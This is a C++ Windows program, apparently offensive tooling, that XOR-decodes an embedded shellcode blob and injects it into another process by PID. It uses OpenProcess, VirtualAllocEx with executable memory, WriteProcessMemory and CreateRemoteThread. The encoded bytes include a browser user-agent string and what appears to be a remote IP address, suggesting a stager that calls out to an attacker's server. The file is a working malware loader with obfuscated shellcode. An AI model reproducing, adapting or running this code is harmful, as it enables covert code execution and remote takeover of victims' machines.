#include "pch.h"
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <Urlmon.h>
#include <tlhelp32.h>
#include <AtlBase.h>
#include <atlconv.h>
#include <string>
#include <codecvt>
#include <locale>
#include <algorithm>

DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!processName.compare(processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

int main(int argc, char* argv[])
{
    unsigned char aa[] = "\x4f\xfb\x30\x57\x43\x5b\x7b\xb3\xb3\xb3\xf2\xe2\xf2\xe3\xe1\xe2\xe5\xfb\x82\x61\xd6\xfb\x38\xe1\xd3\xfb\x38\xe1\xab\xfb\x38\xe1\x93\xfb\x38\xc1\xe3\xfb\xbc\x4\xf9\xf9\xfe\x82\x7a\xfb\x82\x73\x1f\x8f\xd2\xcf\xb1\x9f\x93\xf2\x72\x7a\xbe\xf2\xb2\x72\x51\x5e\xe1\xf2\xe2\xfb\x38\xe1\x93\x38\xf1\x8f\xfb\xb2\x63\xd5\x32\xcb\xab\xb8\xb1\xc6\xc1\x38\x33\x3b\xb3\xb3\xb3\xfb\x36\x73\xc7\xd4\xfb\xb2\x63\xe3\x38\xfb\xab\xf7\x38\xf3\x93\xfa\xb2\x63\x50\xe5\xfb\x4c\x7a\xf2\x38\x87\x3b\xfb\xb2\x65\xfe\x82\x7a\xfb\x82\x73\x1f\xf2\x72\x7a\xbe\xf2\xb2\x72\x8b\x53\xc6\x42\xff\xb0\xff\x97\xbb\xf6\x8a\x62\xc6\x6b\xeb\xf7\x38\xf3\x97\xfa\xb2\x63\xd5\xf2\x38\xbf\xfb\xf7\x38\xf3\xaf\xfa\xb2\x63\xf2\x38\xb7\x3b\xfb\xb2\x63\xf2\xeb\xf2\xeb\xed\xea\xe9\xf2\xeb\xf2\xea\xf2\xe9\xfb\x30\x5f\x93\xf2\xe1\x4c\x53\xeb\xf2\xea\xe9\xfb\x38\xa1\x5a\xfc\x4c\x4c\x4c\xee\xd9\xb3\xfa\xd\xc4\xda\xdd\xda\xdd\xd6\xc7\xb3\xf2\xe5\xfa\x3a\x55\xff\x3a\x42\xf2\x9\xff\xc4\x95\xb4\x4c\x66\xfb\x82\x7a\xfb\x82\x61\xfe\x82\x73\xfe\x82\x7a\xf2\xe3\xf2\xe3\xf2\x9\x89\xe5\xca\x14\x4c\x66\x58\xc0\xe9\xfb\x3a\x72\xf2\xb\x8\xb2\xb3\xb3\xfe\x82\x7a\xf2\xe2\xf2\xe2\xd9\xb0\xf2\xe2\xf2\x9\xe4\x3a\x2c\x75\x4c\x66\x58\xea\xe8\xfb\x3a\x72\xfb\x82\x61\xfa\x3a\x6b\xfe\x82\x7a\xe1\xdb\xb3\xb1\xf3\x37\xe1\xe1\xf2\x9\x58\xe6\x9d\x88\x4c\x66\xfb\x3a\x75\xfb\x30\x70\xe3\xd9\xb9\xec\xfb\x3a\x42\xfb\x3a\x69\xfa\x74\x73\x4c\x4c\x4c\x4c\xfe\x82\x7a\xe1\xe1\xf2\x9\x9e\xb5\xab\xc8\x4c\x66\x36\x73\xbc\x36\x2e\xb2\xb3\xb3\xfb\x4c\x7c\xbc\x37\x3f\xb2\xb3\xb3\x58\x60\x5a\x57\xb2\xb3\xb3\x5b\x11\x4c\x4c\x4c\x9c\xd8\xff\xf1\xd7\xb3\xee\x4a\x62\x47\x1e\x8\xc1\x61\x86\xe2\x55\x8e\x3d\x41\x90\x14\xd0\x37\xdd\x73\x56\xdb\xf4\x37\x89\xc0\x2e\x53\x2\xd0\x9c\xe8\xa\x82\x51\xa5\xaf\xc0\x7c\x72\x28\x4\x51\x3f\x5a\x44\x2a\x7a\xfa\x1a\x21\x68\xb8\x6\x24\x6f\xc\xa3\x41\xeb\x3c\x7b\x42\x31\xb4\xcb\xb5\xb9\xba\x9f\x1\x13\xd0\xb3\xe6\xc0\xd6\xc1\x9e\xf2\xd4\xd6\xdd\xc7\x89\x93\xfe\xdc\xc9\xda\xdf\xdf\xd2\x9c\x86\x9d\x83\x93\x9b\xd0\xdc\xde\xc3\xd2\xc7\xda\xd1\xdf\xd6\x88\x93\xfe\xe0\xfa\xf6\x93\x8a\x9d\x83\x88\x93\xe4\xda\xdd\xd7\xdc\xc4\xc0\x93\xfd\xe7\x93\x85\x9d\x82\x88\x93\xe7\xc1\xda\xd7\xd6\xdd\xc7\x9c\x86\x9d\x83\x88\x93\xff\xf1\xf1\xe1\xfc\xe4\xe0\xf6\xe1\x9a\xbe\xb9\xb3\xd5\x32\xf\xb1\x49\xc9\x15\xe0\x2f\xec\x23\x1b\x1f\xfd\xeb\xc9\x7\x4a\xef\xe0\x4\xad\xf6\x20\xfd\x90\x36\x33\x2a\x9b\x80\xcf\x39\x16\xd3\x67\x79\x3a\x98\xeb\xe1\xc4\x80\x6d\xfc\xf1\x8e\xd8\xf3\xb4\x6f\xb\xc2\xb5\x5b\xa1\x3a\x85\x9b\xb7\xb5\x71\x1e\xaf\x38\xed\x95\x70\x7d\xcf\xf4\x76\xae\xb3\x69\x69\xf3\xdb\x2a\xbd\xf0\x75\x1e\xb4\xf2\x1f\x4d\x47\xa8\xa0\x55\xfd\xc4\xed\x7a\x55\x86\xbd\x31\x15\xed\xdc\x1f\x61\x76\x90\xa1\x97\xc4\xfe\xc5\x3\xd7\x60\xb9\x66\xf4\x5a\x81\xb0\xa0\x6c\xc4\x26\xd3\x3d\x46\x1b\xb7\xf9\xff\x52\xaf\x8a\xbc\x1f\x2a\xc1\xca\xb9\x56\x7\x9c\x4f\x93\xe0\xab\x8c\xc5\x1\x29\x59\x83\xdf\x0\xc1\x48\x44\xaa\x3d\x81\x26\x90\xaa\x55\xce\x5b\x14\x85\xaf\xa8\xd0\x64\x48\xff\x6b\x77\x38\x1f\x15\x15\x49\xbe\x93\x3f\x38\x4b\x80\x15\x63\x7\xf0\xba\x68\xdc\xbc\xf6\xda\x2\xd0\xc2\x5b\xab\xcc\x92\x7b\x2\xe1\x5f\x7e\x7f\xf0\x9b\xc5\xb3\xf2\xd\x43\x6\x11\xe5\x4c\x66\xfb\x82\x7a\x9\xb3\xb3\xf3\xb3\xf2\xb\xb3\xa3\xb3\xb3\xf2\xa\xf3\xb3\xb3\xb3\xf2\x9\xeb\x17\xe0\x56\x4c\x66\xfb\x20\xe0\xe0\xfb\x3a\x54\xfb\x3a\x42\xfb\x3a\x69\xf2\xb\xb3\x93\xb3\xb3\xfa\x3a\x4a\xf2\x9\xa1\x25\x3a\x51\x4c\x66\xfb\x30\x77\x93\x36\x73\xc7\x5\xd5\x38\xb4\xfb\xb2\x70\x36\x73\xc6\x64\xeb\xeb\xeb\xfb\xb6\xb3\xb3\xb3\xb3\xe3\x70\x5b\x2c\x4e\x4c\x4c\x80\x9d\x8b\x87\x9d\x87\x84\x9d\x81\x86\x82\xb3\xd7\x8d\x3a\x65";
    unsigned char bb[1000];
    HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injecting to PID: %i\n", atoi(argv[1]));
    int i = 0;
    for (i = 0; i < sizeof(aa)-1; i++)
    {
        bb[i] = aa[i] ^ 0xb3;
        printf("\\x%02hhx", bb[i]);  
    }

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof bb, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, bb, sizeof bb, NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	return 0;
}